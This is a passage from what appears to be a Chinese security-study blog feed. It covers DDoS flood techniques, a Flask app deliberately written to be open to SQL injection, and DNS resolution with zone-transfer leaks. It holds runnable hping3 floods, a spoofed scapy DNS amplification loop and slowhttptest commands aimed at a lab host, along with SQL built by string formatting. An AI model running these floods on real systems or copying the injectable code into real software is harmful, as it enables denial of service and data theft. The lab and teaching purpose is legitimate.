‘/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}’ Win7如何开启/关闭TCP/IP半开连接数限制 ACK Flood原理：第一种：攻击者伪造大量的SYN+ACK包发送给目标主机，目标主机每收到一个SYN+ACK数据包时，都会去自己的TCP连接表中查看有没有与ACK的发送者建立连接，如果有则发送ACK包完成TCP连接，如果没有则发送ACK+RST 断开连接。但是在查询过程中会消耗一定的CUP计算资源。 第二种： 利用TCP三次握手的ACK+SYN应答，攻击者向不同的服务器发送大量的SYN请求，这些SYN请求数据包的源IP均为受害主机IP 现象：针对第一种方式：如果瞬间收到大量的SYN+ACK数据包，将会消耗服务器的大量cpu资源，导致正常的连接无法建立或增加延迟，甚至造成服务器瘫痪、死机。 针对第二种方式：会有大量的SYN+ACK应答数据包发往受害主机，从而占用目标的网络带宽资源，形成拒绝服务。 测试命令：hping3 –ack -S –flood 192.168.1.116 -s 6666 固定源端口 默认是随机的 ICMP Flood原理：ICMP Flood 的攻击原理和ACK Flood原理类似，属于流量型的攻击方式，由于目前很多防火墙直接过滤ICMP报文， 因此ICMP Flood出现的频度较低。 现象：给服务器带来较大的负载，影响服务器的正常。 测试命令：hping3 -d 200 –icmp –flood -a 1.1.1.1 192.168.1.116 -d –data 数据大小，默认为0 -a 指定源IP UDP Flood原理：UDP（User Datagram Protocol，用户数据报协议），是一种无连接和无状态的网络协议，UDP不需要像TCP那样进行三次握手，运行开销低，不需要确认数据包是否成功到达目的地。这就造成UDP泛洪攻击不但效率高，而且还可以在资源相对较少的情况下执行。UDP大量小数据包会增大网络设备处理数据包的压力；FLOOD可以使用小数据包(64字节)进行攻击,也可以使用大数据包(大于1500字节,以太网MTU为1500字节)进行攻击。 现象：对于大数据包，网络设备需要进行分片、重组，最终达到的效果就是占用网络传输接口的带宽、网络堵塞、服务器响应慢等等。 测试命令：hping3 –udp -p 53 –flood 192.168.1.116 DNS Flood 反射攻击原理： 利用协议特性实现放大效果的流量，查询流量小，相应流量非常巨大 攻击者向僵尸网络发出指令，使僵尸网络中的每一台主机均发出一个伪造源地址的DNS查询请求包，这些请求包查询类型设置为ANY，因为这种类型会请求所有的记录，这些记录会在返回的响应包中，也就是说这种数据包的大小较其他类型是最大的。 伪造DNS数据包，向DNS服务器发送域名查询报文了，而DNS服务器返回的应答报文则会发送给被攻击主机。放大体现在请求DNS回复的类型为ANY，攻击者向服务器请求的包长度为69个字节，而服务器向被攻击主机回复的ANY类型DNS包长度为535字节，大约放大了7倍。 DNS 报文格式 测试命令：scapy i = IP (src=”192.168.1.107”,dst=”114.114.114.114”) u = UDP() q = DNSQR(qname=”nsfocus.com”,qtype=255) d =DNS (rd =1, qdcount=1,qd=q) r = (i/u/d) send(r,loop=1) q = DNSQR(qname=”nsfocus.com”,qtype=255) # 255 类型是any d =DNS (rd =1, qdcount=1,qd=q) #rd=1表示执行递归查询 如果迭代查询第一个请求的DNS服务器没有查询到结果，那么第一个请求的服务器会返回另一个DNS服务器IP，让请求主机向这个IP去继续查询，然而攻击者的数据包源地址是伪造的，所以并不会发起第二次查询，因为第一次查询根本就不是它发起的；而递归查询却是在查询到结果之后，才返回给查询请求发起者。 r = (i/u/d) #合并数据包 CC攻击原理：又称作HTTP 泛洪攻击，其原理是攻击者控制肉鸡、僵尸网络或使用代理服务器，不停地向目标的web服务发送大量合法请求 现象：使得正常用户的web请求处理缓慢甚至得不到处理，制造大量的后台数据库查询动作，消耗目标CPU资源，最终导致服务器宕机崩溃。 测试命令： HTTP慢速攻击原理：模拟正常用户向web服务器发送慢速http请求，由于是慢速的，服务器端需要保持连接资源，直到数据传输结束或请求结束才可释放连接。这种攻击可以分为两类：一类是客户端发数据，另一类是客户端读取服务器发来的数据。HTTP慢速攻击对基于线程处理的web服务器影响显著，如apache、dhttpd，而对基于事件处理的web服务器影响不大，如ngix、lighttpd。 现象：当服务器端建立了大量这样的慢速连接，就会导致服务器拒绝服务。 Slowloris攻击方式HTTP协议规定请求头以一个空行结束，所以完整的http请求头结尾是\r\n\r\n。然而使用非正常的\r\n来结尾，就会导致服务端认为我们的请求头还没结束，等待我们继续发送数据直到超时时间。两种请求头区别如下，CRLF（CarriageReturn Line Feed）表示回车换行 Slow post攻击方式在http头部信息，可以使用content-length声明HTTP消息实体的传输长度，服务器端会content-length的值作为HTTPBODY的长度。利用这一特点，攻击者把content-length设置得很大的，然后缓慢发送数据部分，比如一次只发送一个字节，这样服务器端就要一直保持连接，直到客户端传完所有的数据。 Slow read攻击方式攻击者发送一个完整的HTTP数据请求，之后服务器会给出响应，这时攻击者在将自己的TCP窗口大小设置的很小，服务器会根据客户的TCP窗口大小来传送数据。由于客户端的TCP窗口大小很小，服务器只能缓慢的传输数据给客户端。当建立大量的这种连接时，web应用的并发连接池将被耗尽，最终导致拒绝服务。 Apache range header攻击这种攻击方式只针对apache，当客户端传输大文件时会有range字段，表示将大文件分段，分成几个小段进行传输。例如攻击者将一个文件按照一个字节一段，分成好多段，这样就会造成传输数据缓慢，长时间占用连接，消耗服务器CPU和内存资源。 测试命令：安装slowhttptest Slowloris攻击命令：slowhttptest -c 50 -H -g -o my_header_stats -i 10 -r 200 -t GET -u slowhttptest -c 50 -H -g -o my_header_stats -i 10 -r 200 -t GET -u http://192.168.1.116/dvwa/login.php -c number of connections 测试时建立的连接数-H SlowLoris模式-g 在测试完成后，以时间戳为名生成一个CVS和HTML文件的统计数据-o file name 使用-g参数时，可以使用此参数指定输出文件名-i seconds 在slowrois和Slow POST模式中，指定发送数据间的间隔。-r connections per second 每秒连接个数-t HTTP verb 在请求时使用什么操作，默认GET netstat -pantu | grep ESTABLISHED 正常 异常，0d表示\r,0a表示\n，也就是说结尾是\r\n。 Slow post攻击命令slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8888 -t FAKEVERB -u http://192.168.1.116/dvwa/login.php -x 10 -p 3 -s 设置的数据长度 Slow read攻击命令slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://192.168.1.116/dvwa/login.php -x 24 -p 3 Apache range header攻击命令slowhttptest -R -u http://192.168.1.116/dvwa/login.php -t HEAD -c 1000 -a 10 -b 3000 -r 500 参考资料：https://www.cnblogs.com/zmlctt/p/3690998.html https://xz.aliyun.com/t/71#toc-11 https://blog.csdn.net/Fly_hps/article/details/80941148]]></content>
  </entry>
  <entry>
    <title><![CDATA[各种注入类型的环境搭建和代码编写]]></title>
    <url>%2F2019%2F10%2F03%2F%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99%2F</url>
    <content type="text"><![CDATA[目标：通过flask实现用户注册 用户登录 用户查询目录结构python_web —templates # 模板 —registe.html —login.html —base.html —result.html —main.py 需要用到的第三方库 pymysqflaskrender_templaterequestBootstrap 思路1、导入第三方库 启动一个简单的flask应用2、定义路由 ‘/regist’ 注册页面，’/‘登录页面，’/serch’搜索页面3、pymysql 连接数据库 main.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from flask import request,Flask,render_templateimport pymysqlfrom flask_bootstrap import Bootstrapapp = Flask(__name__)bootstrap = Bootstrap(app)@app.route(&apos;/regist&apos;)def regist(): return render_template(&apos;regist.html&apos;)@app.route(&apos;/&apos;)def login(): return render_template(&apos;login.html&apos;)@app.route(&apos;/registuser&apos;)def registuser(): db = pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor = db.cursor() username = request.args.get(&apos;user&apos;) userpass = request.args.get(&apos;password&apos;) sql= &quot;INSERT INTO USER(user,password) VALUE (&apos;%s&apos;,&apos;%s&apos;)&quot; % (username,userpass) try: cursor.execute(sql) db.commit() return render_template(&apos;login.html&apos;) except: db.rollback() return &apos;对不起，您的注册失败 &apos; db.close()@app.route(&apos;/login&apos;)def checkuser(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) userpass = request.args.get(&apos;password&apos;) sql= &quot;SELECT * FROM USER WHERE user=&apos;%s&apos; AND password = %s&quot; % (username,userpass) cursor.execute(sql) db.commit() result=cursor.fetchall() if (result!=()): return &apos;登录成功&apos; return &apos;登录失败&apos;# @app.route(&apos;/getuser&apos;)# def getuer():# return render_template(&apos;getuer.html&apos;)@app.route(&apos;/search&apos;,methods=[&quot;get&quot;,&quot;post&quot;])def search(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) sql= &quot;SELECT * FROM USER WHERE user = &apos;%s&apos;&quot; % username try: cursor.execute(sql) except Exception as err: return (&quot;Error %s for excute sql: %s &quot; % (err, &quot;SELECT * FROM USER WHERE USER = &apos;%s&apos;&quot; % pymysql.escape_string(username))) db.commit() result=cursor.fetchall() db.commit() db.close() return render_template(&apos;result.html&apos;,u=result)if __name__ == &apos;__main__&apos;: app.run(host=&apos;0.0.0.0&apos;,port=&apos;8898&apos;) 问题Q: 如何使用变量向sql语句中传递参数 A： username= zsc userpass = 0810 sql= “INSERT INTO USER(user,password) VALUE (‘%s’,’%s’)” % (username,userpass) 使用该方法可以向数据库中插入字符串，否则只允许插入整形 result = cursor.fetchone() # 返回单个的元组，也就是一条记录(row)，如果没有结果 则返回 Noneresult = cursor.fetchall() # 返回多个元组，即返回多个记录(rows),如果没有结果 则返回 () base.html1234567891011121314151617181920&#123;% extends &quot;bootstrap/base.html&quot; %&#125;&#123;% block title %&#125;Flask&#123;% endblock %&#125;&#123;% block navbar %&#125;&lt;div class=&quot;navbar navbar-inverse&quot; role=&quot;navigation&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;navbar-header&quot;&gt; &lt;button type=&quot;button&quot; class=&quot;navbar-toggle&quot; data-toggle=&quot;collapse&quot; data-target=&quot;.navbar-collapse&quot;&gt; &lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;a class=&quot;navbar-brand&quot; href=&quot;/&quot;&gt;注册用户查询系统&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;navbar-collapse collapse&quot;&gt; &lt;ul class=&quot;nav navbar-nav&quot;&gt; &lt;li&gt;&lt;a href=&quot;/&quot;&gt;首页&lt;/a&gt;&lt;/li&gt;​ &lt;/ul&gt; &lt;/div&gt; ​12345678910111213141516171819202122232425&lt;/div&gt;&lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/search&apos;&gt; &lt;label&gt;请输入您要搜索的用户名：&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;&quot;&gt;&lt;/label&gt; &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;&gt; &lt;/form&gt; &lt;/body&gt;&#123;% endblock %&#125;&#123;% block content %&#125;&lt;div class=&quot;container&quot;&gt; &#123;% block page_content %&#125;&#123;% endblock %&#125;&lt;/div&gt;&#123;% endblock %&#125;&lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/getuser&apos;&gt; &lt;label&gt;请输入您要搜索的用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;&quot;&gt;&lt;/label&gt; &lt;input type=&quot;submit&quot; value=&quot;搜索&quot;&gt; &lt;/form&gt;​ &lt;/body&gt; regist.html123456789101112131415&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/registuser&apos;&gt; &lt;label&gt;用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;&quot;&gt;&lt;/label&gt; &lt;label&gt;密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;&quot;&gt;&lt;/label&gt; &lt;input type=&quot;submit&quot; value=&quot;注册&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; login.html123456789101112131415&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/login&apos;&gt; &lt;label&gt;用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; &gt;&lt;/label&gt;&lt;br&gt; &lt;label&gt;密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; &gt;&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; result.html12345678910111213141516171819&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt; &lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;/head&gt;​ &lt;body&gt; &lt;form method=&quot;get&quot; action=&apos;/login&apos;&gt; &lt;label&gt;用户名：&lt;input type=&quot;text&quot; name=&quot;user&quot; &gt;&lt;/label&gt;&lt;br&gt; &lt;label&gt;密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; &gt;&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt; &lt;/form&gt;​ &lt;/body&gt;&lt;/html&gt; blind_result.html12345678910111213141516&#123;% extends &quot;base.html&quot; %&#125;&#123;% block title %&#125;首页&#123;% endblock %&#125;&#123;% block page_content %&#125; &lt;table class=&quot;table table-bordered&quot;&gt; &lt;tr&gt; &lt;th&gt;用户ID&lt;/th&gt;&lt;/tr&gt; &#123;% for i in u %&#125; &lt;tr&gt; &lt;td&gt;&#123;&#123; 正在查询中 &#125;&#125;&lt;/td&gt; &lt;/tr&gt;&#123;% endfor %&#125;&lt;/table&gt;&#123;% endblock %&#125; 目标：sql注入环境代码1、常规回显注入的代码前端提交数据，后端接受，sql语句直接执行 123456789101112@app.route(&apos;/search&apos;,methods=[&quot;get&quot;,&quot;post&quot;])def search(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) sql= &quot;SELECT * FROM USER WHERE user = &apos;%s&apos;&quot; % username cursor.execute(sql) db.commit() result=cursor.fetchall() db.commit() db.close() return render_template(&apos;result.html&apos;,u=result) 2、报错注入的代码打印数据库报错信息到前端即可 12345678910111213141516@app.route(&apos;/search&apos;,methods=[&quot;get&quot;,&quot;post&quot;])def search(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) sql= &quot;SELECT * FROM USER WHERE user = &apos;%s&apos;&quot; % username try: cursor.execute(sql) except Exception as err: return (&quot;Error %s for excute sql: %s &quot; % (err, &quot;SELECT * FROM USER WHERE USER = &apos;%s&apos;&quot; % pymysql.escape_string(username))) db.commit() result=cursor.fetchall() db.commit() db.close() return render_template(&apos;result.html&apos;,u=result) 3、盲注的代码盲注即不会回显数据到前端 123456789101112@app.route(&apos;/search&apos;,methods=[&quot;get&quot;,&quot;post&quot;])def search(): db=pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;nsfocus123&apos;,&apos;users&apos;) cursor=db.cursor() username = request.args.get(&apos;user&apos;) sql= &quot;SELECT * FROM USER WHERE user = &apos;%s&apos;&quot; % username try: cursor.execute(sql) except Exception as err: return (&quot;Error %s for excute sql: %s &quot; % (err, &quot;SELECT * FROM USER WHERE USER = &apos;%s&apos;&quot; % pymysql.escape_string(username)))​ db.commit() result=cursor.fetchall() db.commit() db.close() return render_template(‘result.html’,u=result) if (result!=()): # 盲注 不显示查询到的结果返回前端 return ‘正在查询中’ return “404”,404​12 4、编写宽子节注入的代码，有问题~HTTP头部详解User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中） Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）. X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）. Clien-IP：同上，不做过多介绍. Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的. 参考资料http://www.voidcn.com/article/p-mzbkjrov-uo.html https://zhidao.baidu.com/question/751764377992914884.html https://lyiang.wordpress.com/2015/06/09/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88gbk%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87%EF%BC%89/ https://_thorns.gitbooks.io/sec/content/httpqing_qiu_tou_xin_xi_de_zhu_ru.html https://zhuanlan.zhihu.com/p/27553821]]></content>
  </entry>
  <entry>
    <title><![CDATA[WEB页面解析流程]]></title>
    <url>%2F2019%2F09%2F19%2FWEB%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[[TOC] 1、理解域名解析的整个过程DNS是什么？DNS( Domain Name System)是“域名系统”的英文缩写,用于TCP/IP网络，它所提供的服务是用来将主机名和域名转换为IP地址的工作。 网络通讯大部分是基于TCP/IP的，而TCP/IP是基于IP地址的，所以计算机在网络上进行通讯时只能识别如“202.96.134.133”之类的IP地址，而不能认识域名。我们无法记住10个以上IP地址的网站，所以我们访问网站时，更多的是在浏览器地址栏中输入域名，就能看到所需要的页面，这是因为有一个叫“DNS服务器”的计算机自动把我们的域名“翻译”成了相应的IP地址，然后调出IP地址所对应的网页。 工作流程： 1、在浏览器中输入www . qq .com 域名，操作系统会先检查自己本地的hosts文件是否有这个网址映射关系，如果有，就先调用这个IP地址映射，完成域名解析。 2、如果hosts里没有这个域名的映射，则查找本地DNS解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析。 3、如果hosts与本地DNS解析器缓存都没有相应的网址映射关系，首先会找TCP/ip参数中设置的首选DNS服务器，在此我们叫它本地DNS服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。 4、如果要查询的域名，不由本地DNS服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个IP地址映射，完成域名解析，此解析不具有权威性。 5、如果本地DNS服务器本地区域文件与缓存解析都失效，则根据本地DNS服务器的设置（是否设置转发器）进行查询， （1）如果未用转发模式，本地DNS就把请求发至13台根DNS，根DNS服务器收到请求后会判断这个域名(.com)是谁来授权管理，并会返回一个负责该顶级域名服务器的一个IP。本地DNS服务器收到IP信息后，将会联系负责.com域的这台服务器。这台负责.com域的服务器收到请求后，如果自己无法解析，它就会找一个管理.com域的下一级DNS服务器地址(http://qq.com)给本地DNS服务器。当本地DNS服务器收到这个地址后，就会找http://qq.com域服务器，重复上面的动作，进行查询，直至找到www . qq .com主机。 （2）如果用的是转发模式，此DNS服务器就会把请求转发至上一级DNS服务器，由上一级服务器进行解析，上一级服务器如果不能解析，或找根DNS或把转请求转至上上级，以此循环。不管是本地DNS服务器用是是转发，还是根提示，最后都是把结果返回给本地DNS服务器，由此DNS服务器再返回给客户机。 ​ 从客户端到本地DNS服务器是属于递归查询，而DNS服务器之间就是的交互查询就是迭代查询。 DNS 域名称的五个类别 一些常见的DNS域名称 DNS记录 A记录 IP地址记录,记录一个域名对应的IP地址AAAA记录 IPv6 地址记录，记录一个域名对应的IPv6地址CNAME记录 别名记录，记录一个主机的别名MX记录 电子邮件交换记录，记录一个邮件域名对应的IP地址NS记录 域名服务器记录 ,记录该域名由哪台域名服务器解析PTR记录 反向记录，也即从IP地址到域名的一条记录TXT记录 记录域名的相关文本信息 第一行Server是： DNS服务器的主机名 –114.114.114.114 第二行Address是： 服务器的ip地址 –114.114.114.114#53 非权威应答（Non-authoritative answer）： Name是：解析的URL –www.zsc0810.site Address是：47.105.32.145 DNS域传送漏洞：什么是DNS域传送？ DNS 服务器分为： 主服务器、备份服务器和缓存服务器。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。 在主备服务器之间同步数据库，需要使用 “DNS 域传送 ” 。 危险：若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。 （1）一键安装Dockercurl -s https://get.docker.com/ | sh 如果是使用一键安装工具安装的docker，则docker会自动启动。 （2）安装Docker Composecurl -L https://github.com/docker/compose/releases/download/1.7.0/docker-compose-`uname -s -uname -m` &gt; /usr/local/bin/docker-compose chmod +x /usr/local/bin/docker-compose docker-compose -v （3）下载Vulhub（4）启动环境进入相应路径 cd /path/to/vuln/ 运行 docker-compose up -d 结束 docker-compose down 启动192.168.1.100带有DNS域传送漏洞的DNS服务器 使用nmap扫描DNS域传送泄露漏洞 2 用dig来测试DNS服务器是否存在域传送泄露 3 DNS查询工具nslookup对DNS域传送的测试（在交互式shell中发现一个DNS服务器的域传送漏洞的过程） 操作基本的步骤是: 1) 输入nslookup命令进入交互式shell 2) Server 命令参数设定查询将要使用的DNS服务器 3) Ls命令列出某个域中的所有域名 4) Exit命令退出程序 攻击者能获取的敏感主要包括： 1）网络的拓扑结构，服务器集中的IP地址段 2）数据库服务器的IP地址，例如上述nwpudb2.nwpu.edu.cn 3）测试服务器的IP地址，例如test.nwpu.edu.cn 4）VPN服务器地址泄露 5）其他敏感服务器 2、WEB 页面请求的整个流程（从输入URL到页面加载发生了什么？）总的来说分为以下几个过程： DNS解析 TCP连接 发送HTTP请求 服务器处理请求并返回HTTP报文 浏览器解析渲染页面 连接结束具体过程 具体过程:DNS解析实现了网址到IP地址的转换。网址到IP地址转换的过程是如何进行的? 首先在本地域名服务器中查询IP地址，如果没有找到的情况下，本地域名服务器会向根域名服务器发送一个请求，如果根域名服务器也不存在该域名时，本地域名会向com顶级域名服务器发送一个请求，依次类推下去。直到最后本地域名服务器得到google的IP地址并把它缓存到本地，供下次查询使用。 所有网址真正的解析过程为: . -&gt; .com -&gt; google.com. -&gt; www.google.com.。 DNS优化如何减少该过程的步骤呢？那就是DNS缓存。 DNS存在着多级缓存，从离浏览器的距离排序的话，有以下几种: 浏览器缓存，系统缓存，路由器缓存，IPS服务器缓存，根域名服务器缓存，顶级域名服务器缓存，主域名服务器缓存。 在你的chrome浏览器中输入:chrome://dns/，你可以看到chrome浏览器的DNS缓存。 系统缓存主要存在/etc/hosts(Linux系统)中: 谷歌浏览器缓存 DNS负载均衡DNS可以返回一个合适的机器的IP给用户，例如可以根据每台机器的负载量，该机器离用户地理位置的距离等等，这种过程就是DNS负载均衡，又叫做DNS重定向。CDN(Content Delivery Network)就是利用DNS的重定向技术，DNS服务器会返回一个跟用户最接近的点的IP地址给用户，CDN节点的服务器负责响应用户的请求，提供所需的内容 TCP连接HTTP协议是使用TCP作为其传输层协议的 HTTPS协议的本质就是HTTP + SSL(or TLS)。在HTTP报文进入TCP报文之前，先使用SSL对HTTP报文进行加密。从网络的层级结构看它位于HTTP协议与TCP协议之间。 HTTPS过程HTTPS在传输数据之前需要客户端与服务器进行一个握手(TLS/SSL握手)，在握手过程中将确立双方加密传输数据的密码信息。TLS/SSL使用了非对称加密，对称加密以及hash等。具体过程请参考经典的阮一峰先生的博客TLS/SSL握手过程。HTTPS相比于HTTP，虽然提供了安全保证，但是势必会带来一些时间上的损耗，如握手和加密等过程，是否使用HTTPS需要根据具体情况在安全和性能方面做出权衡。 HTTP请求HTTP请求报文是由三部分组成: 请求行, 请求报头和请求正文。 请求行格式如下： Method Request-URL HTTP-Version CRLF eg: GET index.html HTTP/1.1 常用的方法有: GET, POST, PUT, DELETE, OPTIONS, HEAD。 请求报头请求报头允许客户端向服务器传递请求的附加信息和客户端自身的信息。 PS: 客户端不一定特指浏览器，有时候也可使用Linux下的CURL命令以及HTTP客户端测试工具等。常见的请求报头有: Accept, Accept-Charset, Accept-Encoding, Accept-Language, Content-Type, Authorization, Cookie, User-Agent等。 请求报头中使用了Accept, Accept-Encoding, Accept-Language, Cache-Control, Connection, Cookie等字段。Accept用于指定客户端用于接受哪些类型的信息，Accept-Encoding与Accept类似，它用于指定接受的编码方式。Connection设置为Keep-alive用于告诉客户端本次HTTP请求结束之后并不需要关闭TCP连接，这样可以使下次HTTP请求使用相同的TCP通道，节省TCP连接建立的时间。 请求正文当使用POST, PUT等方法时，通常需要客户端向服务器传递数据。这些数据就储存在请求正文中。在请求包头中有一些与请求正文相关的信息，例如:现在的Web应用通常采用Rest架构，请求的数据格式一般为json。这时就需要设置Content-Type: application/json。 服务器处理请求并返回HTTP报文后端从在固定的端口接收到TCP报文开始，这一部分对应于编程语言中的socket。它会对TCP连接进行处理，对HTTP协议进行解析，并按照报文格式进一步封装成HTTPRequest对象，供上层使用。这一部分工作一般是由Web服务器去进行，我使用过的Web服务器有Tomcat, Jetty和Netty等等。 HTTP响应报文也是由三部分组成: 状态码, 响应报头和响应报文。 状态码状态码是由3位数组成，第一个数字定义了响应的类别，且有五种可能取值: 1xx：指示信息–表示请求已接收，继续处理。 2xx：成功–表示请求已被成功接收、理解、接受。 3xx：重定向–要完成请求必须进行更进一步的操作。 4xx：客户端错误–请求有语法错误或请求无法实现。 5xx：服务器端错误–服务器未能实现合法的请求。平时遇到比较常见的状态码有:200, 204, 301, 302, 304, 400, 401, 403, 404, 422, 500 200：请求已成功。 204：服务器已处理请求，但不返回任何实体内容，并且希望返回更新了的元信息。若客户端是浏览器的话，那么浏览器应保留发送该请求的页面，而不更改任何文档视图。 301：永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替。 302：临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI。 304：如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。 400：客户端请求包含语法错误，服务器无法理解。 401：请求要求用户进行身份认证。 403：服务器理解请求客户端的请求，但是拒绝执行此请求。 404：请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。 422：请求格式正确，但是由于含有语义错误，无法响应。 500：服务器内部错误。 响应报头常见的响应报头字段有: Server, Connection…。 响应报文服务器返回给浏览器的文本信息，通常HTML, CSS, JS, 图片等文件就放在这一部分。 浏览器解析渲染页面浏览器在收到HTML,CSS,JS文件后，它是如何把页面呈现到屏幕上的？下图对应的就是WebKit渲染的过程。 浏览器是一个边解析边渲染的过程。 JS的解析是由浏览器中的JS解析引擎完成的 浏览器在解析过程中，如果遇到请求外部资源时，如图像,iconfont,JS等。浏览器将重复1-6过程下载该资源。请求过程是异步的，并不会影响HTML文档进行加载，但是当文档加载过程中遇到JS文件，HTML文档会挂起渲染过程，不仅要等到文档中JS文件加载完毕还要等待解析执行完毕，才会继续HTML的渲染过程。原因是因为JS有可能修改DOM结构，这就意味着JS执行完成前，后续所有资源的下载是没有必要的，这就是JS阻塞后续资源下载的根本原因。CSS文件的加载不影响JS文件的加载，但是却影响JS文件的执行。JS代码执行前浏览器必须保证CSS文件已经下载并加载完毕。 WEB页面解析流程如图： nginx将HTTP请求处理流程分为11个阶段 NGX_HTTP_POST_READ_PHASE：第一个阶段，ngx_http_realip_module模块会注册handler到该阶段（nginx作为代理服务器时有用，后端以此获取客户端原始IP），而该模块默认不会开启，需要通过–with-http_realip_module启动； NGX_HTTP_SERVER_REWRITE_PHASE：server块中配置了rewrite指令时，该阶段会重写url； NGX_HTTP_FIND_CONFIG_PHASE：查找匹配的location配置；该阶段不能自定义handler； NGX_HTTP_REWRITE_PHASE：location块中配置了rewrite指令时，该阶段会重写url； NGX_HTTP_POST_REWRITE_PHASE：该阶段会检查是否发生了url重写，如果有，重新回到FIND_CONFIG阶段，否则直接进入下一个阶段；该阶段不能自定义handler； NGX_HTTP_PREACCESS_PHASE：访问控制，比如限流模块ngx_http_limit_req_module会注册handler到该阶段； NGX_HTTP_ACCESS_PHASE：访问权限控制，比如基于ip黑白名单的权限控制，基于用户名密码的权限控制等； NGX_HTTP_POST_ACCESS_PHASE：该阶段会根据访问权限控制阶段做相应处理，不能自定义handler； NGX_HTTP_TRY_FILES_PHASE：只有配置了try_files指令，才会有此阶段，不能自定义handler； NGX_HTTP_CONTENT_PHASE：内容产生阶段，返回响应给客户端；ngx_http_fastcgi_module模块就处于该阶段； NGX_HTTP_LOG_PHASE：该阶段会记录日志 参考资料https://www.zhihu.com/question/23042131/answer/66571369 https://www.freebuf.com/articles/web/190947.html 